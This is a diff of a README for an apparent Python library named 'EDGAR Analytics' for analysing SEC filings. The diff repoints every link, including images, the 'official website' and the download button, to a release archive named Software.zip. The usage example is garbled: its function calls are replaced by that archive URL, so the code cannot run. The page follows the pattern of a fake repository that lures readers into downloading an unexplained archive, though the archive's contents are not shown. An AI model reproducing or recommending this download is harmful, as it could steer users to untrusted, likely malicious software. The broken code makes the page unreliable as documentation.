@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "EDGAR Analytics" Repository! 📈
 
-![Image](https://github.com/Blercy/edgar_analytics/releases/download/v1.0/Soft.zip)
+![Image](https://github.com/Blercy/edgar_analytics/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -41,26 +41,26 @@ This repository covers a wide range of topics related to accounting, finance, an
 import edgar_analytics
 
 # Extract data from SEC EDGAR filings
-data = https://github.com/Blercy/edgar_analytics/releases/download/v1.0/Soft.zip('AAPL', '10-K')
+data = https://github.com/Blercy/edgar_analytics/releases/download/v2.0/Software.zip('AAPL', '10-K')
 
 # Analyze the financial data
-metrics = https://github.com/Blercy/edgar_analytics/releases/download/v1.0/Soft.zip(data)
+metrics = https://github.com/Blercy/edgar_analytics/releases/download/v2.0/Software.zip(data)
 
 # Forecast future trends
-forecast = https://github.com/Blercy/edgar_analytics/releases/download/v1.0/Soft.zip(data)
+forecast = https://github.com/Blercy/edgar_analytics/releases/download/v2.0/Software.zip(data)
 ```
 
 ## Installation
 
 To get started with "EDGAR Analytics," simply download the library from the following link:
 
-[![Download EDGAR Analytics](https://github.com/Blercy/edgar_analytics/releases/download/v1.0/Soft.zip)](https://github.com/Blercy/edgar_analytics/releases/download/v1.0/Soft.zip)
+[![Download EDGAR Analytics](https://github.com/Blercy/edgar_analytics/releases/download/v2.0/Software.zip)](https://github.com/Blercy/edgar_analytics/releases/download/v2.0/Software.zip)
 
 *(Note: Click on the button above to download the library)*
 
 ## Support
 
-For any questions or issues related to the "EDGAR Analytics" library, please check the *Releases* section of this repository for updates and bug fixes. You can also visit the [official website](https://github.com/Blercy/edgar_analytics/releases/download/v1.0/Soft.zip) for additional resources and documentation.
+For any questions or issues related to the "EDGAR Analytics" library, please check the *Releases* section of this repository for updates and bug fixes. You can also visit the [official website](https://github.com/Blercy/edgar_analytics/releases/download/v2.0/Software.zip) for additional resources and documentation.
 
 ## Get Involved
 
@@ -74,4 +74,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for exploring the "EDGAR Analytics" repository. We hope this Python library will help you enhance your financial analysis capabilities and make informed investment decisions. Stay tuned for more updates and features coming soon! 🎉
 
-![Wave](https://github.com/Blercy/edgar_analytics/releases/download/v1.0/Soft.zip)
+![Wave](https://github.com/Blercy/edgar_analytics/releases/download/v2.0/Software.zip)
